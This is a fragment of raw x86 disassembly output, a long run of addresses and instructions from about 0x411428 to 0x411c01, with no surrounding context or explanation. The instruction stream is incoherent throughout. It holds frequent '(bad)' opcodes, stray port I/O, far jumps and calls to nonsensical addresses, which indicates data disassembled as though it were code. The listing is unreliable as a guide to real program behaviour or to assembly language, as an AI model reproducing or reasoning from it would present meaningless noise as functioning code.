  411428:	pop    ebp
  411429:	lahf   
  41142a:	(bad)  
  41142b:	rol    DWORD PTR [ebx],1
  41142d:	fdivr  st,st(0)
  41142f:	pusha  
  411430:	add    dh,BYTE PTR ds:0xc1e7
  411435:	out    0x2d,al
  411437:	sub    al,0x6c
  411439:	pop    ebx
  41143a:	jp     0x4113d8
  41143c:	outs   dx,BYTE PTR ds:[esi]
  41143d:	push   esp
  41143e:	cmp    cl,BYTE PTR [ebx-0x2e456ed2]
  411444:	outs   dx,BYTE PTR ds:[esi]
  411445:	ins    BYTE PTR es:[edi],dx
  411446:	retf   0x18f2
  411449:	cli    
  41144a:	pop    edx
  41144b:	xchg   ebp,eax
  41144c:	and    DWORD PTR [edi],eax
  41144e:	push   0x2d
  411450:	outs   dx,DWORD PTR ds:[esi]
  411451:	ins    BYTE PTR es:[edi],dx
  411452:	mov    dl,BYTE PTR [ebx]
  411454:	rol    dh,1
  411456:	mov    bh,0xbf
  411458:	add    ch,cl
  41145a:	or     al,0xa8
  41145c:	pop    ebx
  41145d:	mov    ebx,0xc1fbddb0
  411462:	fcom   QWORD PTR [esp+ebx*2+0xb4a1844]
  411469:	or     eax,0xf7ff1b41
  41146e:	outs   dx,DWORD PTR ds:[esi]
  41146f:	lods   al,BYTE PTR ds:[esi]
  411470:	mov    eax,0x1b858edf
  411475:	xchg   esp,eax
  411476:	test   ebp,edi
  411478:	mov    ds:0x3f5d7d91,eax
  41147d:	pop    ebx
  41147e:	adc    DWORD PTR [ebx],ebx
  411480:	shr    DWORD PTR [esi+0x17],1
  411483:	mov    esp,0x98b0da4e
  411488:	mov    BYTE PTR [edx-0x45],0x35
  41148c:	xchg   edx,eax
  41148d:	push   es
  41148e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41148f:	or     dl,ch
  411491:	ja     0x411460
  411493:	xchg   ebp,eax
  411494:	iret   
  411495:	inc    ecx
  411496:	mov    al,0x2b
  411498:	call   0x8184cb8e
  41149d:	fcmovnbe st,st(2)
  4114a0:	mov    dh,0xd0
  4114a2:	fsubr  st(1),st
  4114a4:	pop    ds
  4114a5:	popf   
  4114a6:	(bad)  
  4114a7:	(bad)  [ecx-0x5afafd21]
  4114ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114ae:	or     ch,BYTE PTR [esi+0x1d]
  4114b1:	jmp    0xd7c67e3d
  4114b6:	adc    BYTE PTR [edi],dh
  4114b8:	mov    dh,0xad
  4114ba:	jbe    0x4114d8
  4114bc:	lods   al,BYTE PTR ds:[esi]
  4114bd:	or     bh,dh
  4114bf:	data16 ins BYTE PTR es:[edi],dx
  4114c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114c2:	pop    ebx
  4114c3:	(bad)  [esi+0x583d8a5d]
  4114c9:	dec    edx
  4114ca:	in     eax,dx
  4114cb:	pop    ecx
  4114cc:	int3   
  4114cd:	out    dx,eax
  4114ce:	sbb    ch,BYTE PTR [edx+0x25]
  4114d1:	test   al,0x45
  4114d3:	dec    ebx
  4114d4:	or     BYTE PTR [eax],ch
  4114d6:	xchg   BYTE PTR [eax],al
  4114d8:	dec    ebp
  4114d9:	les    esi,FWORD PTR [esi+0x17b21d54]
  4114df:	out    dx,eax
  4114e0:	jmp    0xd7181154
  4114e5:	add    bh,BYTE PTR [eax+0x47]
  4114e8:	pop    es
  4114e9:	les    ebx,FWORD PTR [edx+0x6c00063c]
  4114ef:	(bad)  
  4114f0:	lea    esi,[esi+0x69]
  4114f3:	mov    ds:0xdbb0909c,eax
  4114f8:	inc    edi
  4114f9:	aam    0xf0
  4114fb:	loopne 0x4114c3
  4114fd:	shl    dl,cl
  4114ff:	(bad)  
  411500:	clc    
  411501:	add    BYTE PTR [eax+0x547aaaef],ah
  411507:	(bad)  
  411508:	jo     0x41150a
  41150a:	mov    bh,0xad
  41150c:	sub    ecx,DWORD PTR [ebx+eax*1]
  41150f:	xchg   edx,eax
  411510:	push   edx
  411511:	cmc    
  411512:	and    eax,0x3097190
  411517:	dec    ebp
  411518:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411519:	lods   al,BYTE PTR ds:[esi]
  41151a:	push   es
  41151b:	mov    ds:0x25dad163,eax
  411520:	and    dl,BYTE PTR [ebx+0x40]
  411523:	cmp    dh,BYTE PTR [eax+edx*1+0x38]
  411527:	sbb    al,BYTE PTR [ecx-0x73]
  41152a:	push   es
  41152b:	aas    
  41152c:	sbb    DWORD PTR [ebp+0x4aa8359c],esp
  411532:	pop    ss
  411533:	sbb    al,0xe
  411535:	jno    0x411514
  411537:	aaa    
  411538:	inc    esp
  411539:	(bad)  [esi-0x89c9150]
  41153f:	jle    0x4114ee
  411541:	cmp    DWORD PTR [edi-0x1],eax
  411544:	ins    DWORD PTR es:[edi],dx
  411545:	pop    ss
  411546:	mov    dh,0xb6
  411548:	mov    cl,0xf5
  41154a:	enter  0xa70e,0x85
  41154e:	jo     0x4114e7
  411550:	mov    edi,0x17634236
  411555:	mov    cl,0x8c
  411557:	loope  0x41156f
  411559:	rcl    BYTE PTR [esi-0x569d50c7],cl
  41155f:	test   eax,0xecd25eea
  411564:	mov    DWORD PTR [ecx+0x4d],ebx
  411567:	mov    ds:0x1ee6c5d5,al
  41156c:	loopne 0x41156d
  41156e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41156f:	and    eax,0x5b68a6c1
  411574:	call   0x565a5b09
  411579:	into   
  41157a:	adc    DWORD PTR [ecx],0xb602146d
  411580:	pop    ss
  411581:	sub    DWORD PTR [esi+0x4b],edi
  411584:	in     al,0x20
  411586:	xchg   esi,eax
  411587:	dec    edx
  411588:	inc    esp
  411589:	mov    ebx,0xcecf6f5f
  41158e:	xor    dl,BYTE PTR [ebx+0x72]
  411591:	mov    bh,0xb6
  411593:	ss push ss
  411595:	retf   0xfa9
  411598:	test   al,0xdc
  41159a:	out    0xc4,eax
  41159c:	scas   al,BYTE PTR es:[edi]
  41159d:	ret    
  41159e:	test   DWORD PTR ds:0xacd76c11,ecx
  4115a4:	(bad)  
  4115a6:	push   ecx
  4115a7:	loop   0x4115fd
  4115a9:	mov    edx,0x9b0a95b1
  4115ae:	adc    BYTE PTR ds:0x53cee08e,ch
  4115b4:	add    BYTE PTR [edi],dh
  4115b6:	dec    edx
  4115b7:	dec    eax
  4115b8:	inc    ebp
  4115b9:	sar    edx,cl
  4115bb:	sub    ah,BYTE PTR [ecx-0x139c1c93]
  4115c1:	jbe    0x4115f3
  4115c3:	lds    ebp,FWORD PTR [edx]
  4115c5:	enter  0xbac8,0xad
  4115c9:	pusha  
  4115ca:	inc    edi
  4115cb:	lds    ebp,FWORD PTR [ebp+0x15]
  4115ce:	push   cs
  4115cf:	fistp  QWORD PTR [edx+eax*1+0x24]
  4115d3:	and    al,0x5b
  4115d5:	paddsw mm1,QWORD PTR [eax]
  4115d8:	test   eax,0xa41a9bde
  4115dd:	cs shl al,1
  4115e0:	push   esi
  4115e1:	fsubr  DWORD PTR [esi+0x2]
  4115e4:	cmp    eax,0x2e43cea2
  4115e9:	pop    ecx
  4115ea:	xor    DWORD PTR [edx+0x206da16b],esi
  4115f0:	dec    edi
  4115f1:	or     ebx,DWORD PTR [ecx-0xb0d415f]
  4115f7:	fild   DWORD PTR [ebp-0x40]
  4115fa:	jbe    0x4115eb
  4115fc:	in     eax,0x7d
  4115fe:	loope  0x41165e
  411600:	inc    esp
  411601:	pop    ecx
  411602:	push   ebx
  411603:	test   al,0xb8
  411605:	ins    DWORD PTR es:[edi],dx
  411606:	pop    ebx
  411607:	sahf   
  411608:	jg     0x4115d8
  41160a:	or     eax,DWORD PTR ds:0x7608a1a
  411610:	mov    al,0x6d
  411612:	dec    esi
  411613:	jnp    0x411632
  411615:	adc    al,0x4d
  411617:	cwde   
  411618:	mov    al,0xbf
  41161a:	mov    dh,0x2d
  41161c:	mov    eax,0x4d682a7a
  411621:	ins    DWORD PTR es:[edi],dx
  411622:	ds stos BYTE PTR es:[edi],al
  411624:	jne    0x41167f
  411626:	sub    BYTE PTR [eax-0x1d],ah
  411629:	ret    0x6190
  41162c:	out    0x21,al
  41162e:	push   ecx
  41162f:	push   ebx
  411630:	xor    BYTE PTR [esi-0x25],0xe8
  411634:	aam    0x6
  411636:	xchg   esi,eax
  411637:	pusha  
  411638:	es mov dh,0xc9
  41163b:	fcmovu st,st(3)
  41163d:	mov    eax,0x64b7b6d1
  411642:	sbb    eax,0x9f7b9b5d
  411647:	pop    ds
  411648:	dec    ebp
  411649:	add    ebx,ebp
  41164b:	pop    edx
  41164c:	push   esp
  41164d:	stc    
  41164e:	aam    0x54
  411650:	pop    esp
  411651:	(bad)  ds:[esi-0x5f249cbb]
  411658:	pushf  
  411659:	xchg   esi,eax
  41165a:	sub    DWORD PTR [esi+0x4a5ec852],ebx
  411660:	aaa    
  411661:	mov    dh,0x8f
  411663:	sub    DWORD PTR [ecx-0x5d],edx
  411666:	je     0x4115f7
  411668:	sub    cl,ah
  41166a:	jg     0x41160d
  41166c:	push   esp
  41166d:	cwde   
  41166e:	or     dh,BYTE PTR [edi-0x7d5747e1]
  411674:	mov    DWORD PTR [ebp+0x17],ebp
  411677:	retf   0xe8ad
  41167a:	inc    edi
  41167b:	in     eax,dx
  41167c:	pop    esi
  41167d:	dec    esp
  41167e:	lods   eax,DWORD PTR ds:[esi]
  41167f:	out    0x59,eax
  411681:	mov    dh,0xc0
  411683:	mov    dh,0x75
  411685:	inc    ecx
  411686:	in     eax,0x85
  411688:	aam    0x8c
  41168a:	mov    al,0x3a
  41168c:	mov    ds:0x4146ad8d,eax
  411691:	pop    eax
  411692:	(bad)  
  411693:	cmp    DWORD PTR [edx-0x15],ebp
  411696:	inc    edi
  411697:	fdivr  QWORD PTR [edx]
  411699:	mov    al,ds:0x6b2dd834
  41169e:	jne    0x4116ad
  4116a0:	mov    edi,0x56d04b11
  4116a5:	retf   0x5b3d
  4116a8:	loope  0x4116ee
  4116aa:	add    BYTE PTR [edx-0x29],0xd8
  4116ae:	fwait
  4116af:	or     bl,ah
  4116b1:	mov    cl,0x9e
  4116b3:	and    esp,DWORD PTR [ecx+0x1b]
  4116b6:	mov    ch,0x5b
  4116b8:	fist   DWORD PTR [edx-0x6e]
  4116bb:	loopne 0x411704
  4116bd:	dec    edi
  4116be:	and    al,0xc8
  4116c0:	jns    0x411699
  4116c2:	lea    eax,[esi+0x6ca74ba0]
  4116c8:	adc    DWORD PTR [edx+0x7f],edx
  4116cb:	(bad)  
  4116cd:	add    eax,0x50e5da97
  4116d2:	gs (bad) 
  4116d4:	dec    ebp
  4116d5:	(bad)  
  4116d6:	jl     0x41174a
  4116d8:	repnz mov dh,0xc4
  4116db:	ret    0x1956
  4116de:	dec    ebp
  4116df:	jge    0x4116f7
  4116e1:	mov    ecx,0xdadd8afd
  4116e6:	fidivr DWORD PTR [edx]
  4116e8:	call   0xef9f33cd
  4116ed:	enter  0x25b8,0x47
  4116f1:	mov    bh,0x76
  4116f3:	arpl   WORD PTR [ebx-0x47],bx
  4116f6:	mov    al,bh
  4116f8:	fild   WORD PTR [ebx]
  4116fa:	inc    ecx
  4116fb:	and    BYTE PTR [ecx-0x25dd4ba4],ah
  411701:	and    bl,BYTE PTR [ecx+edx*1-0x50]
  411705:	sub    BYTE PTR [ebx+eiz*2-0x2f25a49f],ch
  41170c:	cs jmp 0xbb59764f
  411712:	scas   al,BYTE PTR es:[edi]
  411713:	stc    
  411714:	loop   0x411708
  411716:	ins    DWORD PTR es:[edi],dx
  411717:	imul   eax,DWORD PTR [edx+0x460b7e9e],0xf68c00da
  411721:	sub    eax,0xa1b01476
  411726:	daa    
  411727:	or     BYTE PTR [eax+0x3e],cl
  41172a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41172b:	mov    edx,0x821adc4a
  411730:	xor    BYTE PTR ds:0x25f98add,0x68
  411737:	xchg   edi,eax
  411738:	xchg   esi,eax
  411739:	push   ss
  41173a:	popa   
  41173b:	(bad)  
  41173c:	mov    al,0x80
  41173e:	sti    
  41173f:	(bad)  [ebp-0x5249d43b]
  411745:	sub    eax,0xf8379c37
  41174a:	xchg   BYTE PTR ds:0x45d6eac0,ch
  411750:	mov    cl,0x2e
  411752:	fsubp  st(3),st
  411754:	pop    eax
  411755:	mov    ecx,0x85b6332b
  41175a:	test   DWORD PTR [esi+0x287022ed],esp
  411760:	addr16 push es
  411762:	pop    ecx
  411763:	outs   dx,BYTE PTR ds:[esi]
  411764:	jbe    0x4117d1
  411766:	mov    bh,0x25
  411768:	and    eax,0x5211021e
  41176d:	or     BYTE PTR [esi+0x6c8f49a7],dh
  411773:	fisttp DWORD PTR [ebp+0x1bf51aa5]
  411779:	jecxz  0x41171a
  41177b:	xor    eax,0x5bd6eef
  411780:	mov    al,ds:0x9e4e6a5d
  411785:	lods   eax,DWORD PTR ds:[esi]
  411786:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411787:	inc    edi
  411788:	pushf  
  411789:	sbb    ch,BYTE PTR [edx-0x18a9b4f5]
  41178f:	and    BYTE PTR fs:0x61767020,al
  411796:	fcmovnu st,st(2)
  411798:	jecxz  0x41173d
  41179a:	pop    eax
  41179b:	test   DWORD PTR [ebx],ecx
  41179d:	mov    cl,0x43
  41179f:	cld    
  4117a0:	std    
  4117a1:	and    ebx,esp
  4117a3:	mov    dh,0x85
  4117a5:	(bad)  
  4117a6:	out    0xab,al
  4117a8:	aaa    
  4117a9:	xchg   DWORD PTR [ebx+0x55a1f2c8],ebx
  4117af:	pop    ebx
  4117b0:	mov    ebx,0x80681f6d
  4117b5:	jmp    0x6346d419
  4117ba:	pop    ecx
  4117bb:	(bad)  
  4117bc:	cmp    dl,bl
  4117be:	push   0x5337b60a
  4117c3:	out    dx,eax
  4117c4:	cmp    DWORD PTR [edx+0x2edab3c6],ebp
  4117ca:	bound  esp,QWORD PTR [ebx+0x3322755b]
  4117d0:	xor    BYTE PTR [eax+0x72],dl
  4117d3:	mov    eax,ds:0xf82e16dd
  4117d8:	inc    esp
  4117d9:	test   al,0x43
  4117db:	and    edx,DWORD PTR [ecx+0x35b075cc]
  4117e1:	inc    ecx
  4117e2:	mov    bh,0x4d
  4117e4:	es fs cmp al,0xfc
  4117e8:	into   
  4117e9:	pop    es
  4117ea:	jbe    0x41184d
  4117ec:	mov    ds:0x7fc31314,eax
  4117f1:	xor    DWORD PTR [ebp-0x7b],esi
  4117f4:	jecxz  0x4117d0
  4117f6:	fsubr  DWORD PTR [eax-0x49]
  4117f9:	add    eax,0xe4ceb44e
  4117fe:	and    al,0xab
  411800:	fimul  WORD PTR [edx+0x5]
  411803:	push   ebx
  411804:	pop    ebp
  411805:	adc    al,0x5b
  411807:	rcr    ch,cl
  411809:	and    dl,al
  41180b:	popa   
  41180c:	mov    ds:0x504e376d,eax
  411811:	adc    eax,0x60febc8c
  411816:	cmp    dl,0x80
  411819:	jbe    0x411860
  41181b:	jo     0x4117e3
  41181d:	or     DWORD PTR [ebx+ecx*2-0x49],0x6d
  411822:	pop    ebx
  411823:	or     DWORD PTR [eax-0x74],ebp
  411826:	cmp    DWORD PTR [edi-0x6c4cd0ce],edx
  41182c:	fstp   TBYTE PTR [edx]
  41182e:	and    bh,BYTE PTR [eax-0x9d7fdf8]
  411834:	or     ecx,DWORD PTR [ebx]
  411836:	repz das 
  411838:	in     eax,dx
  411839:	add    BYTE PTR [ecx+0x75c28b6d],0xf3
  411840:	inc    eax
  411841:	inc    edx
  411842:	xchg   esp,eax
  411843:	lods   eax,DWORD PTR ds:[esi]
  411844:	or     eax,0xd445b451
  411849:	or     esp,DWORD PTR [edx]
  41184b:	push   ebp
  41184c:	or     eax,0x32aabb04
  411851:	xchg   ebp,eax
  411852:	mov    bh,0xa7
  411854:	xor    eax,0x6da370b9
  411859:	mov    al,ds:0xebe1cb22
  41185e:	xor    eax,0x8d6bbdae
  411863:	test   al,0x6d
  411865:	test   eax,0x2f6e7d82
  41186a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41186b:	mov    DWORD PTR [ebx+0x28135b68],ebp
  411871:	jmp    0x2a1a:0xd2e6e1b6
  411878:	mov    dh,0x5b
  41187a:	pop    ss
  41187b:	mov    edi,DWORD PTR [eax-0x4a]
  41187e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41187f:	data16 sbb BYTE PTR [ebx-0x77],0x68
  411884:	aaa    
  411885:	aas    
  411886:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411887:	sub    al,0x8c
  411889:	mov    DWORD PTR [ecx-0x1d5ab4f3],edi
  41188f:	test   eax,0xf1977548
  411894:	and    dh,ch
  411896:	cmp    BYTE PTR [eax+0x2ca3b52d],0x6b
  41189d:	fnsave ds:0xa37e24bf
  4118a3:	pop    ebp
  4118a4:	jmp    0x56ac:0xac7d8efc
  4118ab:	ss and al,0x77
  4118ae:	add    bh,dh
  4118b0:	xchg   edi,eax
  4118b1:	or     BYTE PTR [esi],ch
  4118b3:	push   ecx
  4118b4:	pop    edx
  4118b5:	mov    eax,0xd4c3437d
  4118ba:	push   ebp
  4118bb:	inc    ebx
  4118bc:	lds    ecx,FWORD PTR [esi]
  4118be:	in     eax,0x2e
  4118c0:	xchg   edx,eax
  4118c1:	aad    0x4
  4118c3:	ins    DWORD PTR es:[edi],dx
  4118c4:	inc    ebx
  4118c5:	jne    0x4118f2
  4118c7:	jge    0x411934
  4118c9:	call   0xa8e6:0x3d541df4
  4118d0:	pop    eax
  4118d1:	mov    eax,0x3ef6b06d
  4118d6:	cmp    eax,0x76d6d3b0
  4118db:	add    DWORD PTR [ebp+ebp*2-0x55],ebp
  4118df:	mov    ax,ds:0x7c7c54dc
  4118e5:	dec    esi
  4118e6:	lods   eax,DWORD PTR ds:[esi]
  4118e7:	std    
  4118e8:	loop   0x4118c0
  4118ea:	and    BYTE PTR [ecx-0x58],bl
  4118ed:	xor    eax,0x353e2663
  4118f2:	cmp    esp,0xb
  4118f5:	aaa    
  4118f6:	mov    dh,0xc4
  4118f8:	push   esi
  4118f9:	pop    ds
  4118fa:	fisub  WORD PTR ds:0xcaac19
  411900:	retf   0x54
  411903:	xor    dl,ch
  411905:	aad    0xa5
  411907:	test   DWORD PTR [esi-0x7fb6ebf0],esi
  41190d:	into   
  41190e:	pop    esi
  41190f:	add    DWORD PTR [edx+0x7a036da0],edi
  411915:	xor    eax,0x6ebeb09f
  41191a:	(bad)  
  41191b:	mov    ds:0xc5d85b71,eax
  411920:	sub    BYTE PTR [edi+ebp*4-0x575150f8],dl
  411927:	or     al,0x42
  411929:	sub    ebx,edx
  41192b:	jbe    0x41193c
  41192d:	xchg   ebp,eax
  41192e:	inc    esp
  41192f:	in     eax,0x1d
  411931:	mov    cl,0x37
  411933:	dec    ebx
  411934:	nop
  411935:	or     esp,edx
  411937:	loop   0x41199b
  411939:	sar    BYTE PTR [edi],cl
  41193b:	xchg   BYTE PTR [edi+0x31152858],dl
  411941:	les    ebp,FWORD PTR [edx]
  411943:	out    dx,al
  411944:	cmp    DWORD PTR [edx-0x20],0xffffffd6
  411948:	adc    DWORD PTR ss:[ecx-0x64769c32],ecx
  41194f:	add    esi,DWORD PTR [ecx]
  411951:	push   ebp
  411952:	test   al,0xa0
  411954:	add    ecx,DWORD PTR [edi]
  411956:	(bad)  
  411958:	(bad)  
  411959:	mov    dh,0x5b
  41195b:	mov    ebx,0x4a942b88
  411960:	xchg   ebp,eax
  411961:	xchg   ebp,eax
  411962:	fcmovnbe st,st(1)
  411964:	ficom  WORD PTR [edi]
  411966:	mov    DWORD PTR ds:0x2edb051b,eax
  41196c:	push   0x446de1fa
  411971:	mov    cl,0xd0
  411973:	jbe    0x41197a
  411975:	repz jne 0x411992
  411978:	sbb    al,0x98
  41197a:	or     BYTE PTR [ebp+0x1d4aad85],0x98
  411981:	sub    bl,bl
  411983:	cmp    DWORD PTR [ecx-0x50],ebp
  411986:	mov    cl,0xb0
  411988:	push   esp
  411989:	fisttp WORD PTR [ecx+0x6c2fa065]
  41198f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411990:	add    ebp,ebp
  411992:	(bad)  
  411993:	cs inc ebp
  411995:	test   BYTE PTR ds:0x8a4,ah
  41199a:	cwde   
  41199b:	mov    eax,ds:0x5a16d8dd
  4119a0:	mov    cl,0x70
  4119a2:	mov    esi,0xb4e18de3
  4119a7:	and    eax,0xb6d2b637
  4119ac:	aam    0x9b
  4119ae:	(bad)  
  4119af:	sbb    edi,DWORD PTR [ebp-0x65]
  4119b2:	jnp    0x4119f9
  4119b4:	(bad)  
  4119b5:	sub    ecx,DWORD PTR [ebx+0x5b]
  4119b8:	add    ebp,DWORD PTR [edi+eiz*4+0x69]
  4119bc:	and    eax,0x17a91a94
  4119c1:	aas    
  4119c2:	fsubr  DWORD PTR [edx+0x51]
  4119c5:	dec    ebx
  4119c6:	pop    edi
  4119c7:	(bad)  
  4119c8:	in     al,0x46
  4119ca:	dec    esp
  4119cb:	ins    DWORD PTR es:[edi],dx
  4119cc:	or     eax,0x904bdda0
  4119d1:	mov    bh,0x3b
  4119d3:	add    eax,0x820b17e0
  4119d8:	in     eax,dx
  4119d9:	mov    dh,0xf2
  4119db:	jne    0x411a09
  4119dd:	lahf   
  4119de:	je     0x411a36
  4119e0:	leave  
  4119e1:	gs mov dh,0x12
  4119e4:	rcr    BYTE PTR [edx-0x73fbfa19],1
  4119ea:	fcom   QWORD PTR [ebp-0x4b]
  4119ed:	mov    al,0xdd
  4119ef:	jno    0x411a33
  4119f1:	hlt    
  4119f2:	dec    ebp
  4119f3:	test   eax,0x51b1c967
  4119f8:	aad    0xd8
  4119fa:	lods   al,BYTE PTR ds:[esi]
  4119fb:	in     al,0x4f
  4119fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119fe:	ret    
  4119ff:	xor    bl,BYTE PTR [ebx]
  411a01:	add    bl,al
  411a03:	inc    esp
  411a04:	inc    ecx
  411a05:	inc    ebp
  411a06:	cwde   
  411a07:	mov    eax,ds:0xcb2b6d8f
  411a0d:	add    ch,BYTE PTR [ebx+0x62567c58]
  411a13:	push   eax
  411a14:	and    BYTE PTR [esi],ch
  411a16:	hlt    
  411a17:	rcr    DWORD PTR [edx-0x4a],0x2c
  411a1b:	cmp    al,0x41
  411a1d:	adc    esi,DWORD PTR [ebp+eax*1+0x3406da16]
  411a24:	test   al,0x97
  411a26:	sub    DWORD PTR [esi+ecx*1+0x5b6b6d4b],0xffffffcb
  411a2e:	pop    esp
  411a2f:	(bad)  
  411a30:	pusha  
  411a31:	fs pushf 
  411a33:	(bad)  [esp+ecx*2]
  411a36:	mov    esp,0xb636db6d
  411a3b:	pop    eax
  411a3c:	jecxz  0x411a84
  411a3e:	sbb    BYTE PTR [ebx],bl
  411a40:	push   cs
  411a41:	fidiv  DWORD PTR gs:[edi]
  411a44:	lds    ecx,FWORD PTR [edx]
  411a46:	ss push ebp
  411a48:	mov    bh,0x66
  411a4a:	and    BYTE PTR [edx+edi*2+0x21],dl
  411a4e:	dec    edx
  411a4f:	dec    eax
  411a50:	mov    dh,0xb6
  411a52:	jo     0x411abf
  411a54:	sbb    BYTE PTR [edx+0x373a9023],cl
  411a5a:	push   ss
  411a5b:	mov    esp,0x56db5c89
  411a60:	sub    BYTE PTR [esi],dl
  411a62:	test   DWORD PTR [ebp-0x37676eac],esp
  411a68:	xor    eax,0xb56c0bf2
  411a6d:	out    dx,al
  411a6e:	or     esi,DWORD PTR [edx+0x6b07bf2]
  411a74:	add    al,bl
  411a76:	out    0x6d,eax
  411a78:	add    edx,ebx
  411a7a:	mov    dh,0x50
  411a7c:	shl    BYTE PTR [edi-0x11],1
  411a7f:	xlat   BYTE PTR ds:[ebx]
  411a80:	shr    BYTE PTR [edx+eiz*4],1
  411a83:	lods   eax,DWORD PTR ds:[esi]
  411a84:	ins    DWORD PTR es:[edi],dx
  411a85:	add    DWORD PTR [ebx+0x40],ecx
  411a88:	sbb    eax,0xb5bbc174
  411a8d:	or     eax,DWORD PTR ds:0x642bbbea
  411a93:	xor    dl,BYTE PTR [eax-0x57]
  411a96:	adc    cl,BYTE PTR [eax]
  411a98:	sub    BYTE PTR [esi-0x2408bd13],dh
  411a9e:	mov    es,WORD PTR [edi+0x67]
  411aa1:	and    esi,esi
  411aa3:	mov    dh,0xdd
  411aa5:	mov    dh,0x1a
  411aa7:	les    edx,FWORD PTR [edx+0x3d8f1031]
  411aad:	jge    0x411b17
  411aaf:	test   BYTE PTR [eax],cl
  411ab1:	ins    BYTE PTR es:[edi],dx
  411ab2:	aaa    
  411ab3:	fiadd  DWORD PTR [ebp+0x231534e8]
  411ab9:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  411abb:	loop   0x411af2
  411abd:	test   eax,0x1d829ad
  411ac2:	mov    al,0x47
  411ac4:	repnz sbb esp,DWORD PTR [ecx]
  411ac7:	push   cs
  411ac8:	mov    BYTE PTR [esi-0x5b],ch
  411acb:	mov    al,ds:0x1a1189ff
  411ad0:	pop    esi
  411ad1:	or     ecx,DWORD PTR [ebx]
  411ad3:	dec    ebx
  411ad4:	in     al,0x9f
  411ad6:	test   BYTE PTR [esi],bl
  411ad8:	push   ebp
  411ad9:	push   ebx
  411ada:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411adb:	outs   dx,DWORD PTR ds:[esi]
  411adc:	fld    TBYTE PTR [ebp+0x40760d6c]
  411ae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ae3:	pop    edx
  411ae4:	xchg   edx,eax
  411ae5:	pop    ds
  411ae6:	shl    DWORD PTR [eax+0xda55bff],1
  411aec:	add    edx,edx
  411aee:	sub    al,0x68
  411af0:	and    ch,bh
  411af2:	push   edi
  411af3:	push   ss
  411af4:	sbb    cl,BYTE PTR [edx-0x763ad692]
  411afa:	loopne 0x411b73
  411afc:	and    al,dh
  411afe:	ins    DWORD PTR es:[edi],dx
  411aff:	pop    ebx
  411b00:	pop    ebx
  411b01:	test   al,0x5f
  411b03:	sbb    bl,BYTE PTR ds:0x88e64f92
  411b09:	pop    ebp
  411b0a:	sub    dl,al
  411b0c:	mov    dh,0xfe
  411b0e:	jg     0x411b3f
  411b10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b11:	push   0xb03487aa
  411b16:	xor    eax,0xacc2b051
  411b1b:	xchg   ecx,eax
  411b1c:	idiv   bl
  411b1e:	sub    eax,0xb6a1842
  411b23:	lea    edx,[bp+di-0x29]
  411b27:	lock pop ebx
  411b29:	sub    ch,bl
  411b2b:	mov    dh,0xdb
  411b2d:	mov    ebp,0x830a7f2f
  411b32:	pop    es
  411b33:	jmp    0x85f7520c
  411b38:	ins    DWORD PTR es:[edi],dx
  411b39:	shl    esi,0x6
  411b3c:	push   ebp
  411b3d:	or     DWORD PTR [eax+eiz*1+0x5d0d94e],esp
  411b44:	mov    ch,0xdd
  411b46:	das    
  411b47:	ret    
  411b48:	test   DWORD PTR [ecx+0x7a],ebx
  411b4b:	mov    dl,0x47
  411b4d:	ins    DWORD PTR es:[edi],dx
  411b4e:	mov    ah,0x6d
  411b50:	mov    ebx,0xc24bf028
  411b55:	xor    al,BYTE PTR [ebx-0x7c846a27]
  411b5b:	mov    ah,0x85
  411b5d:	(bad)  [esi+0x6b5f1326]
  411b63:	push   cs
  411b64:	adc    al,0x7
  411b66:	mov    ch,0x6e
  411b68:	retf   
  411b69:	lock mov ds:0xc2870b0b,eax
  411b6f:	and    eax,0x64f18299
  411b74:	mov    edi,0xa97504db
  411b79:	pop    ds
  411b7a:	cwde   
  411b7b:	pusha  
  411b7c:	xchg   BYTE PTR [eax+ecx*2-0x12f4e213],ah
  411b83:	inc    ebx
  411b84:	push   eax
  411b85:	mov    cl,BYTE PTR [bx+si+0x139b]
  411b8a:	inc    ecx
  411b8b:	shr    DWORD PTR [ebp+0x3ff75b45],0xe9
  411b92:	jge    0x411bf4
  411b94:	cli    
  411b95:	jmp    0x411b17
  411b97:	fiadd  DWORD PTR [ecx]
  411b99:	mov    BYTE PTR [edi+eax*8],al
  411b9c:	jle    0x411b41
  411b9e:	add    DWORD PTR [edi+esi*4+0x76],0x63
  411ba3:	les    eax,FWORD PTR [ecx+0x56bfdd68]
  411ba9:	push   0xffffffbd
  411bab:	mov    ch,0x9
  411bad:	fdiv   DWORD PTR [esi+0x6c]
  411bb0:	dec    eax
  411bb1:	push   esi
  411bb2:	aam    0xef
  411bb4:	inc    esi
  411bb5:	int    0x47
  411bb7:	lods   eax,DWORD PTR ds:[esi]
  411bb8:	ins    DWORD PTR es:[edi],dx
  411bb9:	mov    bh,0xb6
  411bbb:	mov    dl,0x1b
  411bbd:	je     0x411c1b
  411bbf:	ficom  WORD PTR [eax]
  411bc1:	mov    eax,ds:0x35561484
  411bc6:	xchg   esi,eax
  411bc7:	lea    ecx,[esi-0x57c39f3a]
  411bcd:	pop    es
  411bce:	push   0x4e
  411bd0:	mov    ch,0x2d
  411bd2:	xor    al,0xb1
  411bd4:	mov    bl,0xc5
  411bd6:	push   edx
  411bd7:	call   0xb5bb:0xe5f4313
  411bde:	pop    ebx
  411bdf:	sbb    eax,0xfc0a5af3
  411be4:	push   edi
  411be5:	adc    al,0xf2
  411be7:	aam    0x3e
  411be9:	retf   
  411bea:	sub    ch,BYTE PTR [esi+0xb]
  411bed:	ins    DWORD PTR es:[edi],dx
  411bee:	sub    BYTE PTR [ecx+ebp*4+0x43ec4a2e],bh
  411bf5:	mov    eax,ds:0xc49adb70
  411bfa:	mov    al,ds:0x52382a6b
  411bff:	(bad)  
  411c01:	fs pop ebx
